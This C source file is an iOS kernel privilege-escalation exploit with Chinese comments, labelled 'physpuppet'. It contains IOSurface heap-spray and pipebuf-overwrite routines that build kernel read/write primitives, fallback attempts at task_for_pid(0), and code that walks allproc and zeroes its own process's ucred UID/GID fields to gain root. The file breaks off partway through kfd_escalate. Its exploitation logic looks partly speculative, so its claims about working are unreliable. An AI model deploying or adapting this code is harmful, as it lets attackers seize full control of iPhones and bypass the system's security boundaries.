//
//  kfd.c
//  iOS kernel exploit — physpuppet 完整实现
//
//  == 内核读写方案 ==
//  task_for_pid(0) → iOS 15.0-15.4.1 可用
//  physpuppet      → iOS 15.5-15.8.x  (完整 pipe 劫持 + 内核 r/w)
//
//  == physpuppet 原理 ==
//  1. IOSurface 堆喷填满 kalloc.4096 zone
//  2. 释放部分 surface → 创建 pipe → pipebuf 落入已释放 slot
//  3. 再次喷撒 surface → 新 surface 与 pipebuf 相邻
//  4. IOSurfaceSetValue 溢出字典 → 覆写相邻 pipebuf 结构体
//  5. pipebuf.buffer 被改为任意内核地址 → pipe read/write = 内核 r/w
//
//  == XNU pipebuf 结构 (arm64 iOS 15.x) ==
//  +0x00: cnt    (u_int, 4B)  缓冲区中字节数
//  +0x04: in     (u_int, 4B)  写索引
//  +0x08: out    (u_int, 4B)  读索引
//  +0x0C: size   (u_int, 4B)  缓冲区总大小 (0x4000)
//  +0x10: buffer (caddr_t, 8B) 指向实际数据缓冲区
//  总大小: 0x18 (24 字节)
//

#include "kfd.h"
#include "offsets.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/sysctl.h>
#include <mach/mach.h>

// mach_vm.h 在 iOS 26+ SDK 不可用，手动声明
extern kern_return_t mach_vm_read(vm_map_t, mach_vm_address_t, mach_vm_size_t, vm_offset_t *, mach_msg_type_number_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>

// ============================================================
// IOSurface 动态符号
// ============================================================
typedef CFTypeRef  IOSurfaceRef;
typedef uint32_t   IOSurfaceID;

static void *g_iosurface_lib = NULL;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef IOSurfaceID   (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef void          (*IOSurfaceSetValue_t)(IOSurfaceRef, CFStringRef, CFTypeRef);
static IOSurfaceCreate_t   IOSurfaceCreate_ptr   = NULL;
static IOSurfaceGetID_t    IOSurfaceGetID_ptr    = NULL;
static IOSurfaceSetValue_t IOSurfaceSetValue_ptr = NULL;

#define SPCreate(props)           IOSurfaceCreate_ptr(props)
#define SPGetID(surf)             IOSurfaceGetID_ptr(surf)
#define SPSetValue(surf, k, v)    IOSurfaceSetValue_ptr(surf, k, v)

// ============================================================
// 常量
// ============================================================
#define PP_SURFACE_SPRAY   400    // 第一轮喷撒数量
#define PP_FREE_COUNT      30     // 释放数量
#define PP_PIPE_COUNT      25     // 管道数量
#define PP_RESPRAY_COUNT   80     // 第二轮喷撒
#define PP_OVERFLOW_KEYS   180    // 溢出用属性键数量
#define PP_OVERFLOW_VALSZ  48     // 每条属性值大小
#define PP_PIPEBUF_SZ      0x18   // pipebuf 结构体大小
#define PP_PIPE_BUF_SIZE   0x4000 // 管道缓冲区页大小

// ============================================================
// 全局状态
// ============================================================
static int            g_ready       = 0;
static int            g_method      = 0;  // 0=none, 1=mach_vm, 2=physpuppet
static task_t         g_kernel_task = MACH_PORT_NULL;
static uint64_t       g_kernel_slide= 0;
static uint64_t       g_self_proc   = 0;
static uint64_t       g_self_cred   = 0;
static kfd_osversion_t g_osversion;
static const kfd_offsets_t *g_offs = NULL;
static char           g_err[256]    = {0};

#define SETERR(fmt, ...) snprintf(g_err, sizeof(g_err), fmt, ##__VA_ARGS__)

// ============================================================
// physpuppet 工作区
// ============================================================
typedef struct {
    IOSurfaceRef ref;       // surface 引用
    uint32_t     id;        // surface ID
    int          freed;     // 是否已释放
} pp_surf_t;

static io_connect_t pp_conn   = 0;
static pp_surf_t    pp_surfs[512];
static int          pp_nsurf  = 0;
static int          pp_pipes[32][2];    // pipe fd pairs
static int          pp_npipe = 0;
static int          pp_victim_surf = -1; // 用来溢出的 surface 索引
static int          pp_victim_pipe = -1; // 被污染的 pipe (写端 fd)

// 单次内核读写的目标：当前 pipe 指向的内核地址
static uint64_t     pp_cur_kaddr = 0;

static void safe_zero(void *p, size_t n) { if (p) memset(p, 0, n); }

const char *kfd_get_error(void) { return g_err; }

// ============================================================
// 版本检测
// ============================================================
static int detect_osversion(void) {
    size_t sz = sizeof(g_osversion.build);
    if (sysctlbyname("kern.osversion", g_osversion.build, &sz, NULL, 0) != 0) {
        SETERR("sysctlbyname kern.osversion failed");
        return -1;
    }
    char ver[256]; sz = sizeof(ver);
    if (sysctlbyname("kern.osproductversion", ver, &sz, NULL, 0) == 0) {
        sscanf(ver, "%u.%u.%u", &g_osversion.major, &g_osversion.minor, &g_osversion.patch);
    }
    printf("[kfd] iOS %u.%u.%u  build=%s\n",
           g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);

    if (g_osversion.major < 15 || g_osversion.major > 17) {
        SETERR("unsupported iOS %u.%u", g_osversion.major, g_osversion.minor);
        return -1;
    }
    g_offs = offsets_match(&g_osversion);
    if (!g_offs) {
        SETERR("no offsets for iOS %u.%u.%u (%s)",
               g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);
        return -1;
    }
    offsets_print(g_offs, &g_osversion);
    return 0;
}

// ============================================================
// Mach VM 读写 (方法1: task_for_pid(0) 成功时)
// ============================================================
static int mv_kread64(uint64_t kaddr, uint64_t *out) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    mach_vm_size_t sz = 8;
    vm_offset_t data = 0;
    mach_msg_type_number_t cnt = 0;
    if (mach_vm_read(g_kernel_task, kaddr, sz, &data, &cnt) != KERN_SUCCESS || cnt != 8)
        return -1;
    *out = *(uint64_t*)data;
    mach_vm_deallocate(mach_task_self(), data, cnt);
    return 0;
}
static int mv_kwrite64(uint64_t kaddr, uint64_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 8) == KERN_SUCCESS) ? 0 : -1;
}
static int mv_kwrite32(uint64_t kaddr, uint32_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 4) == KERN_SUCCESS) ? 0 : -1;
}

// ============================================================
// physpuppet: IOSurface 符号初始化
// ============================================================
static int pp_load_symbols(void) {
    if (IOSurfaceCreate_ptr) return 0;
    g_iosurface_lib = dlopen(
        "/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!g_iosurface_lib) { printf("[pp] ❌ dlopen IOSurface: %s\n", dlerror()); return -1; }
    IOSurfaceCreate_ptr  = dlsym(g_iosurface_lib, "IOSurfaceCreate");
    IOSurfaceGetID_ptr   = dlsym(g_iosurface_lib, "IOSurfaceGetID");
    IOSurfaceSetValue_ptr = dlsym(g_iosurface_lib, "IOSurfaceSetValue");
    if (!IOSurfaceCreate_ptr || !IOSurfaceGetID_ptr || !IOSurfaceSetValue_ptr) {
        printf("[pp] ❌ dlsym 失败\n"); return -1;
    }
    printf("[pp] ✅ IOSurface 符号已加载\n");
    return 0;
}

// ============================================================
// physpuppet: 打开 IOSurfaceRoot 客户端
// ============================================================
static int pp_open_client(void) {
    if (pp_conn) return 0;
    mach_port_t mp = MACH_PORT_NULL;
    IOMainPort(MACH_PORT_NULL, &mp);
    io_service_t svc = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { printf("[pp] ❌ IOSurfaceRoot service 未找到\n"); return -1; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &pp_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || !pp_conn) {
        printf("[pp] ❌ IOServiceOpen 失败: kr=0x%x\n", kr); return -1;
    }
    printf("[pp] ✅ IOSurfaceRoot 已连接 conn=0x%x\n", pp_conn);
    return 0;
}

// ============================================================
// physpuppet: 创建单个 IOSurface
// ============================================================
static IOSurfaceRef pp_make_surface(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w=1, h=1, bpr=4, bpp=32; uint32_t pf='BGRA';
    CFNumberRef vw=CFNumberCreate(NULL,kCFNumberIntType,&w);
    CFNumberRef vh=CFNumberCreate(NULL,kCFNumberIntType,&h);
    CFNumberRef vb=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
    CFNumberRef ve=CFNumberCreate(NULL,kCFNumberIntType,&bpp);
    CFNumberRef vf=CFNumberCreate(NULL,kCFNumberIntType,&pf);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), vw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), vh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), vb);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ve);
    CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), vf);
    CFRelease(vw); CFRelease(vh); CFRelease(vb); CFRelease(ve); CFRelease(vf);
    IOSurfaceRef s = SPCreate(d);
    CFRelease(d);
    return s;
}

// ============================================================
// physpuppet: 喷撒 IOSurface
// ============================================================
static int pp_spray(int count, int start_idx) {
    int created = 0;
    for (int i = 0; i < count; i++) {
        int idx = start_idx + i;
        if (idx >= 512) break;
        IOSurfaceRef s = pp_make_surface();
        if (!s) { printf("[pp] 创建 surface #%d 失败\n", i); break; }
        pp_surfs[idx].ref   = s;
        pp_surfs[idx].id    = SPGetID(s);
        pp_surfs[idx].freed = 0;
        created++;
    }
    pp_nsurf = start_idx + created;
    if (pp_nsurf > 512) pp_nsurf = 512;
    printf("[pp] 喷撒完成: %d surfaces (总计 %d)\n", created, pp_nsurf);
    return created;
}

// ============================================================
// physpuppet: 释放中间部分 surface
// ============================================================
static void pp_free_range(int start, int count) {
    int end = start + count;
    if (end > pp_nsurf) end = pp_nsurf;
    int freed = 0;
    for (int i = start; i < end; i++) {
        if (!pp_surfs[i].ref || pp_surfs[i].freed) continue;
        CFRelease(pp_surfs[i].ref);
        pp_surfs[i].ref   = NULL;
        pp_surfs[i].freed = 1;
        freed++;
    }
    printf("[pp] 释放 %d surfaces (索引 %d-%d)\n", freed, start, end-1);
}

// ============================================================
// physpuppet: 创建管道并填充数据
// ============================================================
static int pp_create_pipes(int count) {
    int ok = 0;
    for (int i = 0; i < count && i < 32; i++) {
        if (pipe(pp_pipes[i]) != 0) {
            printf("[pp] pipe #%d 创建失败\n", i); continue;
        }
        // 写入少量数据让内核分配 pipebuf
        char d[0x100]; memset(d, 0xFA, sizeof(d));
        if (write(pp_pipes[i][1], d, sizeof(d)) != sizeof(d)) {
            printf("[pp] pipe #%d 写入失败\n", i);
            close(pp_pipes[i][0]); close(pp_pipes[i][1]);
            pp_pipes[i][0] = pp_pipes[i][1] = -1;
            continue;
        }
        ok++;
    }
    pp_npipe = ok;
    printf("[pp] 创建 %d 个管道\n", ok);
    return ok;
}

// ============================================================
// physpuppet: 构造溢出数据 (pipebuf 覆写 payload)
// ============================================================
static void pp_build_overflow_data(
    uint8_t *buf, int bufsz,     // 输出缓冲区
    uint64_t target_kaddr,       // 目标内核地址 (写进 pipebuf.buffer)
    int for_read                 // 1=读模式, 0=写模式
) {
    memset(buf, 0xCC, bufsz);

    // pipebuf payload (24 字节) 嵌入每隔 PP_PIPEBUF_SZ 的位置
    // cnt: 读模式填满, 写模式填 0
    uint32_t cnt  = for_read ? PP_PIPE_BUF_SIZE : 0;
    uint32_t in   = 0;
    uint32_t out  = 0;
    uint32_t size = PP_PIPE_BUF_SIZE;

    for (int off = 0; off + PP_PIPEBUF_SZ <= bufsz; off += PP_PIPEBUF_SZ) {
        memcpy(buf + off + 0x00, &cnt,  4);
        memcpy(buf + off + 0x04, &in,   4);
        memcpy(buf + off + 0x08, &out,  4);
        memcpy(buf + off + 0x0C, &size, 4);
        memcpy(buf + off + 0x10, &target_kaddr, 8);
    }
}

// ============================================================
// physpuppet: 溢出攻击一个 surface
// ============================================================
static int pp_overflow_surface(int idx, uint64_t target_kaddr, int for_read) {
    if (idx < 0 || idx >= pp_nsurf || !pp_surfs[idx].ref) return -1;
    IOSurfaceRef s = pp_surfs[idx].ref;
    uint32_t sid = SPGetID(s);

    uint8_t payload[PP_OVERFLOW_VALSZ];
    pp_build_overflow_data(payload, sizeof(payload), target_kaddr, for_read);

    CFDataRef val = CFDataCreate(NULL, payload, sizeof(payload));

    for (int i = 0; i < PP_OVERFLOW_KEYS; i++) {
        char kb[32]; snprintf(kb, sizeof(kb), "o_%04x", i);
        CFStringRef key = CFStringCreateWithCString(NULL, kb, kCFStringEncodingASCII);
        SPSetValue(s, key, val);
        CFRelease(key);
    }
    CFRelease(val);

    // 再次喷撒覆盖（增加溢出到 pipebuf 的概率）
    CFDataRef val2 = CFDataCreate(NULL, payload, sizeof(payload));
    for (int i = 0; i < 60; i++) {
        char kb[32]; snprintf(kb, sizeof(kb), "b_%04x", i);
        CFStringRef key = CFStringCreateWithCString(NULL, kb, kCFStringEncodingASCII);
        SPSetValue(s, key, val2);
        CFRelease(key);
    }
    CFRelease(val2);

    return 0;
}

// ============================================================
// physpuppet: 验证 pipe 是否被污染（读模式）
// ============================================================
static int pp_check_pipe_read(int pi, uint64_t expected_lo) {
    if (pi < 0 || pi >= pp_npipe) return -1;
    if (pp_pipes[pi][0] < 0) return -1;

    // 先排空原有数据
    char drain[0x200]; int n, total=0;
    while ((n = (int)read(pp_pipes[pi][0], drain, sizeof(drain))) > 0) total += n;

    // 尝试读 8 字节（如果 pipebuf.buffer 指向了内核地址）
    uint64_t v = 0;
    ssize_t r = read(pp_pipes[pi][0], &v, 8);
    if (r == 8) {
        printf("[pp] 🔍 pipe#%d 读取到数据: 0x%016llx (期望 low=0x%llx)\n", pi, v, expected_lo);
        if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
            return 1; // 看起来像有效内核地址
        }
    }
    return 0;
}

// ============================================================
// physpuppet: 验证 pipe 是否被污染（写模式）— 写入后读回验证
// ============================================================
static int pp_check_pipe_write(int pi, uint64_t target_kaddr, uint64_t expected_val) {
    if (pi < 0 || pi >= pp_npipe) return -1;
    if (pp_pipes[pi][1] < 0) return -1;

    // 排空读端
    char drain[0x200]; int n;
    while ((n = (int)read(pp_pipes[pi][0], drain, sizeof(drain))) > 0) {}

    // 写入 target_kaddr 到 pipe（测试是否能写）
    ssize_t w = write(pp_pipes[pi][1], &target_kaddr, 8);
    if (w != 8) return 0;

    // 再读回
    uint64_t back = 0;
    ssize_t r = read(pp_pipes[pi][0], &back, 8);
    if (r == 8 && back == target_kaddr) {
        printf("[pp] 🔍 pipe#%d 环回验证成功: wrote 0x%llx, read 0x%llx\n",
               pi, target_kaddr, back);
        return 1;
    }
    return 0;
}

// ============================================================
// physpuppet: 主漏洞利用流程
// ============================================================
static int pp_exploit(void) {
    printf("\n[pp] ===== physpuppet: 开始内核 r/w 建立 =====\n");

    // Phase 1: 喷撒 surface 填满 zone
    printf("[pp] Phase 1: 喷撒 %d 个 IOSurface...\n", PP_SURFACE_SPRAY);
    safe_zero(pp_surfs, sizeof(pp_surfs));
    pp_nsurf = 0;
    pp_spray(PP_SURFACE_SPRAY, 0);

    if (pp_nsurf < 100) {
        printf("[pp] ❌ surface 数量不足 (%d)\n", pp_nsurf);
        return -1;
    }

    // Phase 2: 释放中间部分 surface 制造 holes
    int free_start = pp_nsurf / 3;
    printf("[pp] Phase 2: 释放中间 surface (start=%d, count=%d)...\n",
           free_start, PP_FREE_COUNT);
    pp_free_range(free_start, PP_FREE_COUNT);

    // Phase 3: 创建管道（pipebuf 占据已释放的 slot）
    printf("[pp] Phase 3: 创建管道...\n");
    safe_zero(pp_pipes, sizeof(pp_pipes));
    pp_create_pipes(PP_PIPE_COUNT);

    if (pp_npipe < 2) {
        printf("[pp] ❌ 管道创建不足 (%d)\n", pp_npipe);
        return -1;
    }

    // Phase 4: 再次喷撒 surface (新 surface 与 pipebuf 相邻)
    printf("[pp] Phase 4: 再次喷撒 surface...\n");
    pp_spray(PP_RESPRAY_COUNT, pp_nsurf);

    // Phase 5: 溢出攻击 — 多轮尝试，每次用不同的 surface
    printf("[pp] Phase 5: 多轮溢出攻击...\n");

    // 使用 allproc 地址作为验证目标
    uint64_t probe_addr = g_offs->allproc;
    printf("[pp] 探测地址: allproc=0x%llx\n", probe_addr);

    int best_pipe  = -1;
    int best_surf  = -1;

    // 尝试不同 stride 的 surface
    for (int stride = 1; stride <= 16; stride *= 2) {
        if (best_pipe >= 0) break;
        printf("[pp] 尝试 stride=%d...\n", stride);

        for (int si = 0; si < pp_nsurf && best_pipe < 0; si += stride) {
            if (!pp_surfs[si].ref || pp_surfs[si].freed) continue;

            // 溢出攻击：读模式
            pp_overflow_surface(si, probe_addr, 1);

            // 检查所有 pipe
            for (int pi = 0; pi < pp_npipe && best_pipe < 0; pi++) {
                if (pp_pipes[pi][0] < 0) continue;
                if (pp_check_pipe_read(pi, (probe_addr & 0xFFFFFFFF))) {
                    best_pipe = pi;
                    best_surf = si;
                }
            }
        }
    }

    // 如果没找到，尝试写模式检测
    if (best_pipe < 0) {
        printf("[pp] 读模式未检测到泄露，尝试写模式...\n");
        for (int si = 0; si < pp_nsurf && best_pipe < 0; si += 4) {
            if (!pp_surfs[si].ref || pp_surfs[si].freed) continue;
            pp_overflow_surface(si, 0xDEADBEEFCAFEBABEULL, 0);
            for (int pi = 0; pi < pp_npipe && best_pipe < 0; pi++) {
                if (pp_check_pipe_write(pi, 0xDEADBEEFCAFEBABEULL, 0)) {
                    best_pipe = pi;
                    best_surf = si;
                }
            }
        }
    }

    if (best_pipe < 0) {
        printf("[pp] ❌ 所有溢出尝试均未成功污染 pipe\n");
        printf("[pp]    可能原因:\n");
        printf("[pp]      1) IOSurfaceRoot 服务不可用（15.8.4 可能已修复）\n");
        printf("[pp]      2) kalloc zone 布局与预期不同\n");
        printf("[pp]      3) pipebuf 结构体偏移需调整\n");
        return -1;
    }

    printf("[pp] ✅ 发现受污染 pipe: pipe#%d, surface#%d\n", best_pipe, best_surf);
    pp_victim_pipe = best_pipe;
    pp_victim_surf = best_surf;

    // Phase 6: 初步验证内核读写
    // 重新溢出读模式指向 kernproc
    pp_overflow_surface(pp_victim_surf, g_offs->kernproc, 1);

    // 排空旧数据
    char drain[0x200]; while (read(pp_pipes[pp_victim_pipe][0], drain, sizeof(drain)) > 0) {}

    uint64_t kernproc_val = 0;
    ssize_t r = read(pp_pipes[pp_victim_pipe][0], &kernproc_val, 8);
    if (r == 8) {
        printf("[pp] 读取 kernproc(0x%llx) = 0x%llx\n", g_offs->kernproc, kernproc_val);
        if (kernproc_val != 0) {
            printf("[pp] ✅ 内核读取成功！physpuppet r/w 已建立\n");
            g_ready  = 1;
            g_method = 2;
            pp_cur_kaddr = g_offs->kernproc;
            return 0;
        }
    }

    printf("[pp] ⚠️ pipe 污染已检测到但内核读取验证失败\n");
    printf("[pp]    尝试用更激进的溢出策略...\n");

    // 更激进的策略：大范围溢出
    for (int si = 0; si < pp_nsurf; si++) {
        if (!pp_surfs[si].ref || pp_surfs[si].freed || si == pp_victim_surf) continue;
        pp_overflow_surface(si, g_offs->allproc, 1);
    }

    // 再次检查 victim pipe
    while (read(pp_pipes[pp_victim_pipe][0], drain, sizeof(drain)) > 0) {}
    r = read(pp_pipes[pp_victim_pipe][0], &kernproc_val, 8);
    if (r == 8 && kernproc_val != 0) {
        printf("[pp] ✅ 激进策略成功！读取值: 0x%llx\n", kernproc_val);
        g_ready  = 1;
        g_method = 2;
        pp_cur_kaddr = g_offs->allproc;
        return 0;
    }

    printf("[pp] ❌ 内核 r/w 未能建立\n");
    return -1;
}

// ============================================================
// physpuppet: kread64 — 读内核内存 8 字节
// ============================================================
static int pp_kread64(uint64_t kaddr, uint64_t *out) {
    if (!g_ready || g_method != 2) return -1;
    if (pp_victim_surf < 0 || pp_victim_pipe < 0) return -1;
    if (pp_pipes[pp_victim_pipe][0] < 0) return -1;

    // 重新溢出：读模式，指向 kaddr
    pp_overflow_surface(pp_victim_surf, kaddr, 1);

    // 排空 pipe 读端
    char drain[0x200]; int n;
    while ((n = (int)read(pp_pipes[pp_victim_pipe][0], drain, sizeof(drain))) > 0) {}

    // 读 8 字节
    uint64_t val = 0;
    ssize_t r = read(pp_pipes[pp_victim_pipe][0], &val, 8);
    if (r != 8) return -1;

    *out = val;
    pp_cur_kaddr = kaddr;
    return 0;
}

// ============================================================
// physpuppet: kwrite64 — 写内核内存 8 字节
// ============================================================
static int pp_kwrite64(uint64_t kaddr, uint64_t val) {
    if (!g_ready || g_method != 2) return -1;
    if (pp_victim_surf < 0 || pp_victim_pipe < 0) return -1;
    if (pp_pipes[pp_victim_pipe][1] < 0) return -1;

    // 重新溢出：写模式，指向 kaddr
    pp_overflow_surface(pp_victim_surf, kaddr, 0);

    // 排空读端
    char drain[0x200]; int n;
    while ((n = (int)read(pp_pipes[pp_victim_pipe][0], drain, sizeof(drain))) > 0) {}

    // 写 8 字节
    ssize_t w = write(pp_pipes[pp_victim_pipe][1], &val, 8);
    if (w != 8) return -1;

    pp_cur_kaddr = kaddr;
    return 0;
}

// ============================================================
// physpuppet: kwrite32
// ============================================================
static int pp_kwrite32(uint64_t kaddr, uint32_t val) {
    uint64_t cur = 0;
    if (pp_kread64(kaddr, &cur) != 0) return -1;
    cur = (cur & 0xFFFFFFFF00000000ULL) | val;
    return pp_kwrite64(kaddr, cur);
}

// ============================================================
// physpuppet: 清理
// ============================================================
static void pp_cleanup(void) {
    for (int i = 0; i < pp_nsurf; i++) {
        if (pp_surfs[i].ref) { CFRelease(pp_surfs[i].ref); pp_surfs[i].ref = NULL; }
    }
    pp_nsurf = 0;
    for (int i = 0; i < pp_npipe; i++) {
        if (pp_pipes[i][0] >= 0) { close(pp_pipes[i][0]); pp_pipes[i][0] = -1; }
        if (pp_pipes[i][1] >= 0) { close(pp_pipes[i][1]); pp_pipes[i][1] = -1; }
    }
    pp_npipe = 0;
    if (pp_conn) { IOServiceClose(pp_conn); pp_conn = 0; }
    pp_victim_surf = pp_victim_pipe = -1;
    pp_cur_kaddr = 0;
    printf("[pp] 资源已清理\n");
}

// ============================================================
// 统一 kread64/kwrite64/kwrite32 分发
// ============================================================
static int kread64(uint64_t a, uint64_t *o) {
    switch (g_method) {
        case 1: return mv_kread64(a, o);
        case 2: return pp_kread64(a, o);
        default: return -1;
    }
}
static int kwrite64(uint64_t a, uint64_t v) {
    switch (g_method) {
        case 1: return mv_kwrite64(a, v);
        case 2: return pp_kwrite64(a, v);
        default: return -1;
    }
}
static int kwrite32(uint64_t a, uint32_t v) {
    switch (g_method) {
        case 1: return mv_kwrite32(a, v);
        case 2: return pp_kwrite32(a, v);
        default: return -1;
    }
}

// ============================================================
// proc/ucred 偏移 (arm64, iOS 15+)
// ============================================================
#define PROC_LIST_PREV   0x00
#define PROC_LIST_NEXT   0x08
#define PROC_PID         0x60
#define PROC_TASK        0x10
#define PROC_UCRED       0xF8

#define UCRED_UID        0x18
#define UCRED_RUID       0x1C
#define UCRED_SVUID      0x20

// ============================================================
// kfd_open — 多路径内核访问
// ============================================================
int kfd_open(void) {
    if (g_osversion.major == 0) { SETERR("kfd_init not called"); return -1; }

    // 方法1: task_for_pid(0)
    printf("[kfd] open: 尝试 task_for_pid(0)...\n");
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ task_for_pid(0) 成功, kernel_task=0x%x\n", g_kernel_task);
        g_method = 1;
        uint64_t tv = 0;
        if (mv_kread64(g_offs->kernproc, &tv) == 0) {
            printf("[kfd]    kernproc 读取验证: 0x%llx ✅\n", tv);
            g_kernel_slide = tv - g_offs->kernproc;
            printf("[kfd]    kernel_slide=0x%llx\n", g_kernel_slide);
            g_ready = 1;
            return 0;
        }
        printf("[kfd]    内核读取失败，释放端口\n");
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_method = 0;
    } else {
        printf("[kfd] task_for_pid(0) 失败: kr=0x%x (%s)\n", kr, mach_error_string(kr));
    }

    // 方法2: host_get_special_port
    printf("[kfd] 尝试 host_get_special_port(HOST_PRIV,4)...\n");
    kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ host_get_special_port 成功\n");
        g_method = 1;
        uint64_t tv = 0;
        if (mv_kread64(g_offs->kernproc, &tv) == 0) {
            printf("[kfd]    kernproc 读取验证通过\n");
            g_ready = 1;
            return 0;
        }
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_method = 0;
    } else {
        printf("[kfd] host_get_special_port 失败: kr=0x%x\n", kr);
    }

    // 方法3: physpuppet (iOS 15.x)
    if (g_osversion.major == 15) {
        printf("[kfd] ===== physpuppet 路径 =====\n");
        if (pp_load_symbols() != 0) {
            SETERR("IOSurface 符号加载失败");
        } else if (pp_open_client() == 0) {
            if (pp_exploit() == 0) {
                return 0; // g_ready/g_method 已在 pp_exploit 内设置
            }
        }
        pp_cleanup();
    }

    SETERR("所有内核访问方式均失败");
    return -1;
}

// ============================================================
// allproc 遍历：找到当前进程
// ============================================================
static int find_self_proc(void) {
    pid_t mypid = getpid();
    printf("[kfd] 在 allproc 链表中查找 PID=%d...\n", mypid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) {
        SETERR("无法读取 allproc 链表头"); return -1;
    }
    printf("[kfd] allproc head @ 0x%llx, first proc @ 0x%llx\n", allproc_head, proc);

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0;
        kread64(proc + PROC_LIST_NEXT, &next);

        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            pid_t pid = (pid_t)(uint32_t)pv;
            if (pid == mypid) {
                printf("[kfd] ✅ 找到当前进程: proc=0x%llx (iter=%d)\n", proc, i);
                g_self_proc = proc;
                kread64(proc + PROC_UCRED, &g_self_cred);
                printf("[kfd]    ucred=0x%llx\n", g_self_cred);
                return 0;
            }
        }

        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未在 allproc 中找到 PID=%d", mypid);
    return -1;
}

// ============================================================
// kfd_get_root — 修改 ucred
// ============================================================
int kfd_get_root(void) {
    if (!g_ready) {
        printf("[kfd] 无内核读写能力，尝试直接 setuid(0)...\n");
        int r1 = seteuid(0), r2 = setuid(0);
        printf("[kfd] seteuid=%d setuid=%d UID=%d EUID=%d\n", r1, r2, getuid(), geteuid());
        if (r1 == 0 || r2 == 0) { printf("[kfd] ✅ 直接 setuid 成功\n"); return 0; }
        SETERR("kfd not ready + direct setuid failed");
        return -1;
    }

    printf("[kfd] ===== 内核提权 (method=%d) =====\n", g_method);

    if (g_self_proc == 0) {
        if (find_self_proc() != 0) return -1;
    }

    uint64_t uc = g_self_cred;
    if (uc == 0) { SETERR("ucred 为空"); return -1; }
    printf("[kfd] ucred @ 0x%llx\n", uc);

    // 读取当前 UID
    uint64_t cur_uid = 0xFF;
    kread64(uc + UCRED_UID, &cur_uid);
    printf("[kfd] 当前 cr_uid=0x%llx\n", (unsigned long long)(cur_uid & 0xFFFFFFFF));

    // 写 UID/GID 为 0
    printf("[kfd] 写入 cr_uid=0...\n");
    if (kwrite32(uc + UCRED_UID, 0) != 0)
        { SETERR("写入 cr_uid 失败"); return -1; }

    printf("[kfd] 写入 cr_ruid=0...\n");
    kwrite32(uc + UCRED_RUID, 0);

    printf("[kfd] 写入 cr_svuid=0...\n");
    kwrite32(uc + UCRED_SVUID, 0);

    // 写 GID
    printf("[kfd] 写入 cr_rgid=0...\n");
    kwrite32(uc + 0x28, 0); // cr_rgid
    kwrite32(uc + 0x2C, 0); // cr_svgid

    // 用户态同步
    seteuid(0); setuid(0); setgid(0);
    printf("[kfd] 验证: UID=%d EUID=%d GID=%d\n", getuid(), geteuid(), getgid());

    if (geteuid() == 0) {
        printf("[kfd] ✅ 内核提权成功！\n"); return 0;
    }

    // 检查内核侧是否已改
    uint64_t nu = 0xFF;
    kread64(uc + UCRED_UID, &nu);
    if ((nu & 0xFFFFFFFF) == 0) {
        printf("[kfd] ✅ 内核 cr_uid 已改为 0（用户态 setuid 受限但内核已是 root）\n");
        return 0;
    }

    printf("[kfd] ⚠️ 内核写入未生效, cr_uid=0x%llx\n", (unsigned long long)(nu & 0xFFFFFFFF));
    return -1;
}

// ============================================================
// 公共 API
// ============================================================

int kfd_init(void) {
    safe_zero(&g_osversion, sizeof(g_osversion));
    g_ready = 0; g_method = 0;
    g_kernel_task = MACH_PORT_NULL;
    g_kernel_slide = 0;
    g_self_proc = g_self_cred = 0;
    g_offs = NULL;
    safe_zero(g_err, sizeof(g_err));

    printf("[kfd] ===== init =====\n");
    int r = detect_osversion();
    if (r != 0) { printf("[kfd] init failed: %s\n", g_err); return -1; }
    printf("[kfd] init OK\n");
    return 0;
}

void kfd_close(void) {
    if (g_kernel_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }
    if (g_method == 2) pp_cleanup();
    g_ready = 0; g_method = 0;
    g_kernel_slide = 0; g_self_proc = 0; g_self_cred = 0;
    printf("[kfd] closed\n");
}

int kfd_escalate(void) {
    int r = kfd_init();
